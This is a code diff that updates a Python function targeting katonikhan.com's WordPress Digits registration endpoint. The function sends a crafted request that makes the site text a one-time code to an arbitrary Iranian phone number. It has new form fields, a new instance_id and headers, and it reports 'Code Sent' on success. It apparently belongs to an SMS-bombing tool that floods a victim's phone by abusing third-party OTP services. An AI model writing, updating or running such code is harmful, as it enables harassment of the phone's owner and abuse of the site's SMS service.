@@ -57,18 +57,23 @@ def katonikhan(phone):
         
         payload = {
             "phone": formatted_phone,
-            "digt_countrycode": "+98", 
+            "digt_countrycode": "+98",
             "digits_process_register": "1",
-            "instance_id": "c1866f4215f82aaedb42ab38190ef1fa",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "instance_id": "f2cf6e724788dcfaacd48173e7215663",  # instance_id جدید
             "optional_data": "optional_data",
             "action": "digits_forms_ajax",
             "type": "register",
-            "dig_otp": "",
+            "dig_otp": "otp",  # تغییر از "" به "otp"
             "digits": "1",
             "digits_redirect_page": "-1",
             "aio_special_field": "",
             "digits_form": "92e2d882a6",
-            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F"
+            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
+            "container": "digits_protected",  # اضافه شده
+            "sub_action": "sms_otp"  # اضافه شده
         }
         
         headers = {
@@ -77,23 +82,24 @@ def katonikhan(phone):
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://katonikhan.com",
             "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8"
         }
         
         response = requests.post(url, data=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            print(f'{g}[+] Response: {response.text}{a}')
-            if '"success":true' in response.text:
-                print(f'{g}(katonikhan) {a}Request Successful')
+            response_data = response.json()
+            if response_data.get("success") is True:
+                print(f'{g}(katonikhan) {a}Code Sent to +98{digits_phone}')
                 return True
         
         print(f'{r}[-] (katonikhan) Failed{a}')
         return False
             
-    except Exception as e:
-        print(f'{r}[!] katonikhan Error: {e}{a}')
+    except Exception:
+        print(f'{r}[-] (katonikhan) Failed{a}')
         return False
-
 
 
 
